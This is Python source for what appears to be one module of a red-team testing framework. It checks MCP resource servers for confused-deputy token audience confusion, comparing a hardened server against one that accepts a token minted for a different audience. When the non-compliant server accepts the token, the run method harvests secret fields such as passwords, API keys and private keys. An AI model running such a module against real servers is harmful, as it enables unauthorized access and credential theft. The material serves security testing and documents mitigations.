"""CUT-EXEC-005 — Confused-Deputy via Token Audience Confusion (MCP 2026-07-28).

The MCP 2026-07-28 authorization spec is emphatic: a resource server **MUST only accept tokens
specifically intended for itself** (RFC 8707 audience binding) and **token passthrough is
explicitly forbidden**. A server that honors a token minted for a *different* audience becomes a
confused deputy — it acts on a credential that was never meant for it. This is the class behind
much of the 2026 MCP CVE wave.

``standin`` proves it honestly, against the *same* mis-audienced token:

  1. **Control** — present a token legitimately minted for a low-value resource (``notes-api``)
     to a **hardened** records server. It validates the audience (RFC 8707) and issuer
     (RFC 9207) and **refuses**: the token was not issued for it.
  2. **Exploit** — present the *same* token to the **non-compliant** records server. It accepts
     any token the authorization server issued, regardless of audience, and hands back the
     crown-jewel record — the confused deputy.

Refused-when-validated vs granted-when-not, for the same token, is the finding.

How this differs from its neighbors:
  * ``proxy`` (CUT-PRIV-001) rides an agent's own delegated token past its *scope*; ``standin``
    exploits a server accepting a token minted for a *different audience* — a distinct control
    (RFC 8707 audience validation) with a distinct fix.
  * ``puppet`` (CUT-EXEC-001) coerces a tool call through a trusting agent; ``standin`` needs no
    agent — it replays a token directly across resource servers.

Detection / mitigation (MCP 2026-07-28):
  * Validate the token audience — a server MUST reject any token not issued for it (RFC 8707),
    and MUST validate the issuer to avoid mix-up attacks (RFC 9207).
  * Never pass a client's token through to an upstream API; obtain a separate token for the
    upstream audience.
  * Issue short-lived, resource-bound tokens so a leaked or mis-scoped token has a small blast
    radius.
"""

from __future__ import annotations

from typing import Any

from cutout_range import connect_range

from cutout.engine.evidence import Phase
from cutout.engine.module import BaseModule, Option
from cutout.engine.registry import register
from cutout.engine.session import CheckResult, RunResult, Session

_SECRET_FIELDS = ("api_secret", "api_key", "secret", "password", "token", "private_key")


def _harvest(data: Any) -> dict[str, str]:
    found: dict[str, str] = {}
    if isinstance(data, dict):
        for key, value in data.items():
            if str(key).lower() in _SECRET_FIELDS and value is not None:
                found[str(key)] = str(value)
    return found


@register
class TokenConfusion(BaseModule):
    id = "CUT-EXEC-005"
    alias = "standin"
    name = "Confused-Deputy via Token Audience Confusion"
    tactic = "EXEC"
    targets = ["mcp", "tool"]
    options = {
        "token_audience": Option(
            help="A low-value audience to legitimately mint a token for.",
            default="notes-api",
            type="str",
        ),
        "vuln_server": Option(
            help="A resource server that does not validate token audience.",
            default="customer-records",
            type="str",
        ),
        "strict_server": Option(
            help="A hardened resource server used as the control (validates audience + issuer).",
            default="customer-records-strict",
            type="str",
        ),
    }

    def _opt(self, key: str) -> str:
        val = self.opts.get(key)
        return str(val) if val is not None else str(self.options[key].default)

    async def check(self, session: Session) -> CheckResult:
        rng = connect_range(session.target)
        if not hasattr(rng, "mint_token") or not hasattr(rng, "present_token"):
            return CheckResult(
                module_id=self.id,
                susceptible=False,
                reason="target exposes no OAuth-style resource servers to confuse",
            )
        servers = getattr(rng, "resource_servers", {})
        vuln = servers.get(self._opt("vuln_server"))
        exposed = vuln is not None and not getattr(vuln, "validate_audience", True)
        return CheckResult(
            module_id=self.id,
            susceptible=exposed,
            reason=(
                f"'{self._opt('vuln_server')}' accepts tokens regardless of audience "
                "(no RFC 8707 validation) — a token minted for another resource is honored"
                if exposed
                else f"resource server '{self._opt('vuln_server')}' validates token audience"
            ),
            data={"vuln_server": self._opt("vuln_server")},
        )

    async def run(self, session: Session) -> RunResult:
        rng = connect_range(session.target)
        if not hasattr(rng, "mint_token") or not hasattr(rng, "present_token"):
            return RunResult(
                status="skipped", summary="target has no OAuth-style resource-server surface"
            )
        audience = self._opt("token_audience")
        vuln, strict = self._opt("vuln_server"), self._opt("strict_server")

        token = rng.mint_token(audience)
        await self.emit(
            Phase.RUN,
            "exec.begin",
            {"token_audience": getattr(token, "audience", audience), "vuln_server": vuln},
        )

        # 1) Control: a hardened server rejects a token not issued for it.
        control = rng.present_token(strict, token)
        control_denied = not control.get("ok")
        await self.emit(
            Phase.RUN,
            "exec.control",
            {"server": strict, "denied": control_denied, "error": control.get("error")},
        )

        # 2) Exploit: the non-compliant server honors the same mis-audienced token.
        deputy = rng.present_token(vuln, token)
        loot = _harvest(deputy.get("data")) if deputy.get("ok") else {}
        await self.emit(
            Phase.RUN,
            "exec.deputy",
            {"server": vuln, "accepted": deputy.get("ok", False), "secret_fields": sorted(loot)},
        )

        secrets_found = {f"{vuln}:{field}": value for field, value in loot.items()}
        session.secrets.update(secrets_found)
        session.graph.add_node(vuln, kind="mcp", sensitive=True)
        session.graph.add_edge(f"token:{audience}", vuln, kind="audience-confusion")
        session.artifacts["token_confusion"] = {
            "token_audience": audience,
            "vuln_server": vuln,
            "control_denied": control_denied,
            "accepted": bool(loot),
            "harvested_secret_keys": sorted(secrets_found),
        }
        if secrets_found:
            await self.emit(Phase.RUN, "exec.harvested", {"secret_keys": sorted(secrets_found)})

        won = control_denied and bool(loot)
        status = "success" if won else "failed"
        await self.emit(
            Phase.RUN,
            "exec.result",
            {"control_denied": control_denied, "confused_deputy": bool(loot)},
        )
        if won:
            summary = (
                f"confused deputy via token audience confusion: a token minted for '{audience}' "
                f"was refused by the hardened server ({strict}) but accepted by '{vuln}' "
                f"(no RFC 8707 validation), leaking {len(secrets_found)} secret(s)"
            )
        elif not control_denied:
            summary = f"the hardened server '{strict}' also accepted the token; no validation gap"
        else:
            summary = f"'{vuln}' did not leak a secret for the mis-audienced token"
        return RunResult(
            status=status,
            summary=summary,
            data={
                "control_denied": control_denied,
                "accepted": bool(loot),
                "harvested_secret_keys": sorted(secrets_found),
            },
        )
